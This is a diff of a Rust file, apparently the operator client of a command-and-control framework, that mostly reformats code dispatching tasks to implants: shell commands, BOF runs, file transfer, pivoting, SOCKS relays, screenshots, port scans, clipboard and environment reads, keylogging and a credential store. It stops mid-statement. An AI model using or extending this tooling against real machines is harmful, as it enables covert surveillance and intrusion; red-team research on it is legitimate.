@@ -7,6 +7,7 @@
 
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::time::{Duration, Instant};
+use urlencoding::encode;
 
 use crate::parse::{self};
 use crate::types::{CredEntry, CredKind, FileEntry, ProcEntry, ResultView, SessionView, TaskAck};
@@ -48,7 +49,10 @@ pub enum ParsedTable {
     Audit(Vec<AuditRow>),
     /// Queued (undelivered) tasks for a session, from `GET /api/tasks`.
     Tasks(Vec<TaskRow>),
-    Image { path: String, bytes: usize },
+    Image {
+        path: String,
+        bytes: usize,
+    },
     Profile {
         loaded: bool,
         http_get_uri: String,
@@ -141,30 +145,70 @@ pub enum Cmd {
     Connect(String, Option<String>),
     /// Run a shell command on the selected session. `parse` tells the worker to
     /// route the parsed output to the fullscreen overlay instead of the log.
-    Shell { session: String, args: String, parse: ParseAs },
+    Shell {
+        session: String,
+        args: String,
+        parse: ParseAs,
+    },
     /// Run a BOF on the selected session.
-    Bof { session: String, name: String, args: String, data_hex: String },
+    Bof {
+        session: String,
+        name: String,
+        args: String,
+        data_hex: String,
+    },
     /// Upload a file (name + hex bytes).
-    Upload { session: String, name: String, data_hex: String },
+    Upload {
+        session: String,
+        name: String,
+        data_hex: String,
+    },
     /// Download a file; chunks stream back as log lines + saved bytes.
-    Download { session: String, path: String, local: Option<String> },
+    Download {
+        session: String,
+        path: String,
+        local: Option<String>,
+    },
     /// Task the beacon to exit (`{"type":"exit"}`).
     Exit { session: String },
     /// Set the beacon's beacon interval (and optional jitter %).
-    Sleep { session: String, seconds: u32, jitter_pct: u8 },
+    Sleep {
+        session: String,
+        seconds: u32,
+        jitter_pct: u8,
+    },
     /// Liveness probe (`{"type":"ping"}`); an `ok` result confirms the beacon
     /// is still alive.
     Ping { session: String },
     /// 文件系统操作（cd/mkdir/rm/mv/cp）。
-    FileOp { session: String, op: String, path: String, dest: Option<String> },
+    FileOp {
+        session: String,
+        op: String,
+        path: String,
+        dest: Option<String>,
+    },
     /// 从 implant 发起出站连接（P2P / rportfwd）。chan 由 server 分配。
-    Pivot { session: String, host: String, port: u16 },
+    Pivot {
+        session: String,
+        host: String,
+        port: u16,
+    },
     /// SOCKS5 中继控制。
-    Socks { session: String, chan: u32, op: u8, addr: String, port: u16 },
+    Socks {
+        session: String,
+        chan: u32,
+        op: u8,
+        addr: String,
+        port: u16,
+    },
     /// 截屏。
     Screenshot { session: String, monitor: u8 },
     /// 端口扫描。
-    Portscan { session: String, host: String, ports: String },
+    Portscan {
+        session: String,
+        host: String,
+        ports: String,
+    },
     /// 网络信息收集。
     Net { session: String, query: String },
     /// 磁盘信息。
@@ -285,8 +329,13 @@ pub fn spawn(server: String, token: Option<String>) -> Bridge {
 #[derive(Clone)]
 enum TaskKind {
     Shell(ParseAs),
-    Bof { name: String },
-    Download { path: String, local: Option<String> },
+    Bof {
+        name: String,
+    },
+    Download {
+        path: String,
+        local: Option<String>,
+    },
     /// 截屏：结果以 FileChunk 分块返回，保存到 downloads/screenshot-<taskid>.png
     Screenshot,
     /// A ping; an `ok` result confirms the beacon is alive.
@@ -316,8 +365,7 @@ async fn worker_loop(
         .timeout(Duration::from_secs(8))
         .build()
         .expect("reqwest client build");
-    let mut server: Option<(String, Option<String>)> =
-        Some((initial_server, initial_token));
+    let mut server: Option<(String, Option<String>)> = Some((initial_server, initial_token));
 
     let mut pending: Vec<PendingTask> = Vec::new();
     let mut log_buf: Vec<LogLine> = Vec::new();
@@ -338,7 +386,11 @@ async fn worker_loop(
                     server = Some((s, t));
                     connect_changed = true;
                 }
-                Cmd::Shell { session, args, parse } => {
+                Cmd::Shell {
+                    session,
+                    args,
+                    parse,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -351,16 +403,25 @@ async fn worker_loop(
                                 Level::Info,
                             );
                             pending.push(PendingTask {
-                                session, task_id: tid, kind: TaskKind::Shell(parse),
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(parse),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
                                 started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
+                                chunks: Vec::new(),
+                                saw_eof: false,
                             });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! enqueue: {e}"), Level::Err),
                     }
                 }
-                Cmd::Bof { session, name, args, data_hex } => {
+                Cmd::Bof {
+                    session,
+                    name,
+                    args,
+                    data_hex,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -373,16 +434,26 @@ async fn worker_loop(
                                 Level::Info,
                             );
                             pending.push(PendingTask {
-                                session, task_id: tid, kind: TaskKind::Bof { name },
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Bof { name },
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
                                 started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
+                                chunks: Vec::new(),
+                                saw_eof: false,
                             });
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! bof enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! bof enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::Upload { session, name, data_hex } => {
+                Cmd::Upload {
+                    session,
+                    name,
+                    data_hex,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -395,120 +466,207 @@ async fn worker_loop(
                                 Level::Info,
                             );
                             pending.push(PendingTask {
-                                session, task_id: tid, kind: TaskKind::Shell(ParseAs::None),
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
                                 started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
+                                chunks: Vec::new(),
+                                saw_eof: false,
                             });
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! upload enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! upload enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::AddCred { realm, user, kind, secret } => {
-    let Some((ref srv, ref tok)) = server else {
-      log_push(&mut log_buf, "! not connected", Level::Err); continue;
-    };
-    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind, "secret": secret});
-    match authed(client.post(format!("{srv}/api/creds")).json(&body), tok).send().await {
-      Ok(r) if r.status().is_success() => log_push(&mut log_buf, "cred: added/updated", Level::Ok),
-      Ok(r) => log_push(&mut log_buf, &format!("! cred add: {}", r.status()), Level::Err),
-      Err(e) => log_push(&mut log_buf, &format!("! cred add: {e}"), Level::Err),
-    }
-  }
-  Cmd::DelCred { realm, user, kind } => {
-    let Some((ref srv, ref tok)) = server else {
-      log_push(&mut log_buf, "! not connected", Level::Err); continue;
-    };
-    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind});
-    match authed(client.post(format!("{srv}/api/creds/delete")).json(&body), tok).send().await {
-      Ok(r) if r.status().is_success() => log_push(&mut log_buf, "cred: deleted", Level::Ok),
-      Ok(r) => log_push(&mut log_buf, &format!("! cred del: {}", r.status()), Level::Err),
-      Err(e) => log_push(&mut log_buf, &format!("! cred del: {e}"), Level::Err),
-    }
-  }
-  Cmd::VerifyAudit => {
-    let Some((ref srv, ref tok)) = server else {
-      log_push(&mut log_buf, "! not connected", Level::Err); continue;
-    };
-    match authed(client.get(format!("{srv}/api/audit/verify")), tok).send().await {
-      Ok(r) => match r.json::<AuditVerifyResponse>().await {
-        Ok(v) => {
-          if v.ok {
-            log_push(&mut log_buf, "audit chain: OK", Level::Ok);
-          } else if let Some(b) = v.broken_at {
-            log_push(&mut log_buf, &format!("audit chain: BROKEN at seq {b}"), Level::Err);
-          } else {
-            log_push(&mut log_buf, "audit chain: UNKNOWN", Level::Warn);
-          }
-          // Wire the parsed table so the fullscreen overlay opens (same class
-          // of bug as FetchProfile — without this /audit verify only logs).
-          parsed_buf = Some(ParsedTable::AuditVerify { ok: v.ok, broken_at: v.broken_at });
-        }
-        Err(e) => log_push(&mut log_buf, &format!("! audit verify parse: {e}"), Level::Err),
-      },
-      Err(e) => log_push(&mut log_buf, &format!("! audit verify: {e}"), Level::Err),
-    }
-  }
-  Cmd::FetchProfile => {
-    let Some((ref srv, ref tok)) = server else {
-      log_push(&mut log_buf, "! not connected", Level::Err); continue;
-    };
-    match authed(client.get(format!("{srv}/api/profile")), tok).send().await {
-      Ok(r) => match r.json::<ProfileSummary>().await {
-        Ok(p) => {
-          if !p.loaded {
-            log_push(&mut log_buf, "profile: not loaded", Level::Warn);
-          } else {
-            log_push(&mut log_buf, &format!("profile: loaded http-get: {} http-post: {} useragent: {}", p.http_get_uri, p.http_post_uri, p.useragent), Level::Info);
-            // Wire the parsed table so the fullscreen overlay opens (the whole
-            // point of `/profile`). Without this the Profile overlay, the
-            // poll_worker Profile arm and the render Overlay::Profile arm are
-            // all dead code — `/profile` only logged before.
-            parsed_buf = Some(ParsedTable::Profile {
-              loaded: p.loaded,
-              http_get_uri: p.http_get_uri,
-              http_post_uri: p.http_post_uri,
-              useragent: p.useragent,
-            });
-          }
-        }
-        Err(e) => log_push(&mut log_buf, &format!("! profile parse: {e}"), Level::Err),
-      },
-      Err(e) => log_push(&mut log_buf, &format!("! profile fetch: {e}"), Level::Err),
-    }
-  }
-  Cmd::CloseChan { chan } => {
-    let Some((ref srv, ref tok)) = server else {
-      log_push(&mut log_buf, "! not connected", Level::Err); continue;
-    };
-    let cmd = serde_json::json!({"type": "channelclose", "chan": chan});
-    match enqueue_simple(&client, srv, "", cmd, tok).await {
-      Ok(tid) => log_push(&mut log_buf, &format!("chan {chan} close → task {tid}"), Level::Info),
-      Err(e) => log_push(&mut log_buf, &format!("! chan close: {e}"), Level::Err),
-    }
-  }
-Cmd::Download { session, path, local } => {
-	let Some((ref srv, ref tok)) = server else {
-		log_push(&mut log_buf, "! not connected", Level::Err);
-		continue;
-	};
-	match enqueue_download(&client, srv, &session, &path, tok).await {
-		Ok(tid) => {
-			log_push(&mut log_buf, &format!("[{}] download {} (task {})", short(&session), path, tid), Level::Info);
-			// Downloads stream FileChunk results — must register a pending task
-			// so the result-poll loop collects chunks and saves them to `local`
-			// (route_result at TaskKind::Download derives the save path from it).
-			pending.push(PendingTask {
-				session, task_id: tid,
-				kind: TaskKind::Download { path: path.clone(), local: local.clone() },
-				backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
-				started_at: Instant::now(), chunks: Vec::new(), saw_eof: false,
-			});
-		}
-		Err(e) => log_push(&mut log_buf, &format!("! download enqueue: {e}"), Level::Err),
-	}
-}
-                Cmd::Sleep { session, seconds, jitter_pct } => {
+                Cmd::AddCred {
+                    realm,
+                    user,
+                    kind,
+                    secret,
+                } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind, "secret": secret});
+                    match authed(client.post(format!("{srv}/api/creds")).json(&body), tok)
+                        .send()
+                        .await
+                    {
+                        Ok(r) if r.status().is_success() => {
+                            log_push(&mut log_buf, "cred: added/updated", Level::Ok)
+                        }
+                        Ok(r) => log_push(
+                            &mut log_buf,
+                            &format!("! cred add: {}", r.status()),
+                            Level::Err,
+                        ),
+                        Err(e) => log_push(&mut log_buf, &format!("! cred add: {e}"), Level::Err),
+                    }
+                }
+                Cmd::DelCred { realm, user, kind } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind});
+                    match authed(
+                        client.post(format!("{srv}/api/creds/delete")).json(&body),
+                        tok,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) if r.status().is_success() => {
+                            log_push(&mut log_buf, "cred: deleted", Level::Ok)
+                        }
+                        Ok(r) => log_push(
+                            &mut log_buf,
+                            &format!("! cred del: {}", r.status()),
+                            Level::Err,
+                        ),
+                        Err(e) => log_push(&mut log_buf, &format!("! cred del: {e}"), Level::Err),
+                    }
+                }
+                Cmd::VerifyAudit => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    match authed(client.get(format!("{srv}/api/audit/verify")), tok)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<AuditVerifyResponse>().await {
+                            Ok(v) => {
+                                if v.ok {
+                                    log_push(&mut log_buf, "audit chain: OK", Level::Ok);
+                                } else if let Some(b) = v.broken_at {
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!("audit chain: BROKEN at seq {b}"),
+                                        Level::Err,
+                                    );
+                                } else {
+                                    log_push(&mut log_buf, "audit chain: UNKNOWN", Level::Warn);
+                                }
+                                // Wire the parsed table so the fullscreen overlay opens (same class
+                                // of bug as FetchProfile — without this /audit verify only logs).
+                                parsed_buf = Some(ParsedTable::AuditVerify {
+                                    ok: v.ok,
+                                    broken_at: v.broken_at,
+                                });
+                            }
+                            Err(e) => log_push(
+                                &mut log_buf,
+                                &format!("! audit verify parse: {e}"),
+                                Level::Err,
+                            ),
+                        },
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! audit verify: {e}"), Level::Err)
+                        }
+                    }
+                }
+                Cmd::FetchProfile => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    match authed(client.get(format!("{srv}/api/profile")), tok)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<ProfileSummary>().await {
+                            Ok(p) => {
+                                if !p.loaded {
+                                    log_push(&mut log_buf, "profile: not loaded", Level::Warn);
+                                } else {
+                                    log_push(&mut log_buf, &format!("profile: loaded http-get: {} http-post: {} useragent: {}", p.http_get_uri, p.http_post_uri, p.useragent), Level::Info);
+                                    // Wire the parsed table so the fullscreen overlay opens (the whole
+                                    // point of `/profile`). Without this the Profile overlay, the
+                                    // poll_worker Profile arm and the render Overlay::Profile arm are
+                                    // all dead code — `/profile` only logged before.
+                                    parsed_buf = Some(ParsedTable::Profile {
+                                        loaded: p.loaded,
+                                        http_get_uri: p.http_get_uri,
+                                        http_post_uri: p.http_post_uri,
+                                        useragent: p.useragent,
+                                    });
+                                }
+                            }
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! profile parse: {e}"), Level::Err)
+                            }
+                        },
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! profile fetch: {e}"), Level::Err)
+                        }
+                    }
+                }
+                Cmd::CloseChan { chan } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    let cmd = serde_json::json!({"type": "channelclose", "chan": chan});
+                    match enqueue_simple(&client, srv, "", cmd, tok).await {
+                        Ok(tid) => log_push(
+                            &mut log_buf,
+                            &format!("chan {chan} close → task {tid}"),
+                            Level::Info,
+                        ),
+                        Err(e) => log_push(&mut log_buf, &format!("! chan close: {e}"), Level::Err),
+                    }
+                }
+                Cmd::Download {
+                    session,
+                    path,
+                    local,
+                } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    match enqueue_download(&client, srv, &session, &path, tok).await {
+                        Ok(tid) => {
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] download {} (task {})", short(&session), path, tid),
+                                Level::Info,
+                            );
+                            // Downloads stream FileChunk results — must register a pending task
+                            // so the result-poll loop collects chunks and saves them to `local`
+                            // (route_result at TaskKind::Download derives the save path from it).
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Download {
+                                    path: path.clone(),
+                                    local: local.clone(),
+                                },
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
+                        }
+                        Err(e) => log_push(
+                            &mut log_buf,
+                            &format!("! download enqueue: {e}"),
+                            Level::Err,
+                        ),
+                    }
+                }
+                Cmd::Sleep {
+                    session,
+                    seconds,
+                    jitter_pct,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -516,10 +674,16 @@ Cmd::Download { session, path, local } => {
                     match enqueue_sleep(&client, srv, &session, seconds, jitter_pct, tok).await {
                         Ok(tid) => log_push(
                             &mut log_buf,
-                            &format!("[{}] sleep {seconds}s (±{jitter_pct}%) → task {}", short(&session), tid),
+                            &format!(
+                                "[{}] sleep {seconds}s (±{jitter_pct}%) → task {}",
+                                short(&session),
+                                tid
+                            ),
                             Level::Info,
                         ),
-                        Err(e) => log_push(&mut log_buf, &format!("! sleep enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! sleep enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
                 Cmd::Ping { session } => {
@@ -530,11 +694,14 @@ Cmd::Download { session, path, local } => {
                     match enqueue_ping(&client, srv, &session, tok).await {
                         Ok(tid) => {
                             pending.push(PendingTask {
-                                session: session.clone(), task_id: tid,
+                                session: session.clone(),
+                                task_id: tid,
                                 kind: TaskKind::Ping,
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
                                 started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
+                                chunks: Vec::new(),
+                                saw_eof: false,
                             });
                             log_push(
                                 &mut log_buf,
@@ -542,7 +709,9 @@ Cmd::Download { session, path, local } => {
                                 Level::Info,
                             );
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! ping enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! ping enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
                 Cmd::Exit { session } => {
@@ -559,12 +728,19 @@ Cmd::Download { session, path, local } => {
                         Err(e) => log_push(&mut log_buf, &format!("! exit: {e}"), Level::Err),
                     }
                 }
-                Cmd::FileOp { session, op, path, dest } => {
+                Cmd::FileOp {
+                    session,
+                    op,
+                    path,
+                    dest,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
                     };
-                    match enqueue_fileop(&client, srv, &session, &op, &path, dest.as_deref(), tok).await {
+                    match enqueue_fileop(&client, srv, &session, &op, &path, dest.as_deref(), tok)
+                        .await
+                    {
                         Ok(tid) => {
                             log_push(
                                 &mut log_buf,
@@ -572,16 +748,26 @@ Cmd::Download { session, path, local } => {
                                 Level::Info,
                             );
                             pending.push(PendingTask {
-                                session, task_id: tid, kind: TaskKind::Shell(ParseAs::None),
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
                                 started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
+                                chunks: Vec::new(),
+                                saw_eof: false,
                             });
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! fileop enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! fileop enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::Pivot { session, host, port } => {
+                Cmd::Pivot {
+                    session,
+                    host,
+                    port,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -594,14 +780,26 @@ Cmd::Download { session, path, local } => {
                             };
                             log_push(
                                 &mut log_buf,
-                                &format!("[{}] pivot → {host}:{port} (task {}){chan_msg}", short(&session), tid),
+                                &format!(
+                                    "[{}] pivot → {host}:{port} (task {}){chan_msg}",
+                                    short(&session),
+                                    tid
+                                ),
                                 Level::Info,
                             );
                         }
-                        Err(e) => log_push(&mut log_buf, &format!("! pivot enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! pivot enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
-                Cmd::Socks { session, chan, op, addr, port } => {
+                Cmd::Socks {
+                    session,
+                    chan,
+                    op,
+                    addr,
+                    port,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
                         continue;
@@ -609,185 +807,418 @@ Cmd::Download { session, path, local } => {
                     match enqueue_socks(&client, srv, &session, chan, op, &addr, port, tok).await {
                         Ok(tid) => log_push(
                             &mut log_buf,
-                            &format!("[{}] socks chan {chan} {addr}:{port} (task {})", short(&session), tid),
+                            &format!(
+                                "[{}] socks chan {chan} {addr}:{port} (task {})",
+                                short(&session),
+                                tid
+                            ),
                             Level::Info,
                         ),
-                        Err(e) => log_push(&mut log_buf, &format!("! socks enqueue: {e}"), Level::Err),
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! socks enqueue: {e}"), Level::Err)
+                        }
                     }
                 }
                 Cmd::Screenshot { session, monitor } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "screenshot", "monitor": monitor });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] screenshot monitor {monitor} (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Screenshot, backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] screenshot monitor {monitor} (task {})",
+                                    short(&session),
+                                    tid
+                                ),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Screenshot,
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! screenshot: {e}"), Level::Err),
                     }
                 }
-                Cmd::Portscan { session, host, ports } => {
+                Cmd::Portscan {
+                    session,
+                    host,
+                    ports,
+                } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
-                    let cmd = serde_json::json!({ "type": "portscan", "host": host, "ports": ports });
+                    let cmd =
+                        serde_json::json!({ "type": "portscan", "host": host, "ports": ports });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] portscan {host} {ports} (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] portscan {host} {ports} (task {})",
+                                    short(&session),
+                                    tid
+                                ),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! portscan: {e}"), Level::Err),
                     }
                 }
                 Cmd::Net { session, query } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "net", "query": query });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] net {query} (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] net {query} (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! net: {e}"), Level::Err),
                     }
                 }
                 Cmd::DriveInfo { session } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let command = serde_json::json!({ "type": "driveinfo" });
                     match enqueue_simple(&client, srv, &session, command, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] driveinfo (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] driveinfo (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! driveinfo: {e}"), Level::Err),
                     }
                 }
                 Cmd::Clipboard { session } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let command = serde_json::json!({ "type": "clipboard" });
                     match enqueue_simple(&client, srv, &session, command, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] clipboard (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] clipboard (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! clipboard: {e}"), Level::Err),
                     }
                 }
                 Cmd::Env { session, name } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "env", "name": name });
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] env {name} (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] env {name} (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Shell(ParseAs::None),
+                                backoff: TASK_BACKOFF_START,
+                                last_poll: Instant::now(),
+                                started_at: Instant::now(),
+                                chunks: Vec::new(),
+                                saw_eof: false,
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! env: {e}"), Level::Err),
                     }
                 }
                 Cmd::Keylog { session, action } => {
                     let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
                     };
                     let cmd = serde_json::json!({ "type": "keylog", "action": action });
-                    let label = match action { 0 => "start", 1 => "stop", _ => "dump" };
+                    let label = match action {
+                        0 => "start",
+                        1 => "stop",
+                        _ => "dump",
+                    };
                     match enqueue_simple(&client, srv, &session, cmd, tok).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] keylog {label} (task {})", short(&session), tid), Level::Info);
-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] keylog {label} (task {})", short(&session), tid),
+                                Level::Info,
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
